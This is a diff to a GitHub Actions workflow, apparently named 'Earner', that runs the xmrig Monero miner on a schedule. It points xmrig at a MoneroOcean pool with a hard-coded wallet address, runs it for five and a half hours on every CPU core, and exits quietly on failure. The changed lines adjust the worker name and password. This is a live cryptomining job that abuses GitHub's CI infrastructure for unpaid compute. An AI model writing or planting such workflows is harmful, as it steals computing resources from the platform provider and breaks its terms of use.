@@ -1,4 +1,4 @@
-name: Earner2
+name: Earner1
 
 on:
   schedule:
@@ -35,7 +35,7 @@ jobs:
           # Run for 5 hours 30 minutes (19800 seconds)
           timeout 19800s ./xmrig \
             -o gulf.moneroocean.stream:10128 \
-            -u 44SpTnkYyc9NmH3QjJkoLtVc3DXXJGwfD7tvhF1zwNRz9JbAMeHNiCD4wb8ivNvo3edgrntc3ra1meA5uZhT3vbaJ1ApPT1 \
-            -p github-run \
+            -u 44SpTnkYyc9NmH3QjJkoLtVc3DXXJGwfD7tvhF1zwNRz9JbAMeHNiCD4wb8ivNvo3edgrntc3ra1meA5uZhT3vbaJ1ApPT1.github-run1 \
+            -p x \
             -k --coin monero \
             -t $(nproc) || exit 0
